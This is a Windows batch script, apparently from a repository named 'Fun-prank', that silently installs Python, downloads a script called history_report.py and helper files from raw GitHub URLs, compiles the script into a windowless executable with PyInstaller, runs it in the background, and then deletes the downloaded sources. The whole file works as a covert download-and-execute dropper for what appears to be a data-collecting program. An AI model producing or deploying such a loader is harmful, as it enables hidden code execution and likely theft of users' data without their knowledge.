@echo off
:: Step 1: Create the "history" folder if it doesn't exist
if not exist "history" (
    mkdir "history"
)

:: Step 2: Check if Python is installed
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo Python is not installed. Installing Python silently...
    powershell -Command "Start-Process 'https://www.python.org/ftp/python/3.9.9/python-3.9.9-amd64.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -NoNewWindow -Wait"
)

:: Step 3: Install pip if not installed
where pip >nul 2>nul
if %errorlevel% neq 0 (
    echo pip is not installed. Installing pip silently...
    python -m ensurepip --upgrade
)

:: Step 4: Download the requirements.txt from GitHub into the "history" folder
echo Downloading requirements.txt...
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/requirements.txt -OutFile history\requirements.txt"

:: Step 5: Install necessary Python libraries from requirements.txt
echo Installing necessary libraries from requirements.txt...
python -m pip install -r history\requirements.txt

:: Step 6: Check if requests library is installed
python -c "import requests" >nul 2>nul
if %errorlevel% neq 0 (
    echo Requests installation failed. Exiting...
    pause
    exit /b
)

:: Step 7: Download the Python script from GitHub into the "history" folder
echo Downloading Python script...
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/history_report.py -OutFile history\history_report.py"

:: Step 8: Download the .bat file for running silently into the "history" folder
echo Downloading .bat file for running silently...
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/install_run_silent.bat -OutFile history\install_run_silent.bat"

:: Step 9: Check if the Python script exists
if not exist "history\history_report.py" (
    echo Script file not found. Please make sure history_report.py is in the "history" folder.
    pause
    exit /b
)

:: Step 10: Convert the Python script to an executable using PyInstaller with explicit imports
echo Converting script to executable...
pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=psutil --hidden-import=gpuinfo history\history_report.py

:: Step 11: Check if the executable was created
if not exist "dist\history_report.exe" (
    echo Failed to create executable. Exiting...
    pause
    exit /b
)

:: Step 12: Move the executable to the "history" folder
echo Moving executable to "history" folder...
move /Y dist\history_report.exe history\history_report.exe

:: Step 13: Run the executable silently
echo Running the executable silently...
start /B history\history_report.exe

:: Step 14: Clean up PyInstaller files (optional)
echo Cleaning up PyInstaller files...
rd /s /q "build"
del /q "history_report.spec"

:: Step 15: Clean up the downloaded files from the "history" folder
del history\install_run_silent.bat
del history\history_report.py
del history\requirements.txt

pause
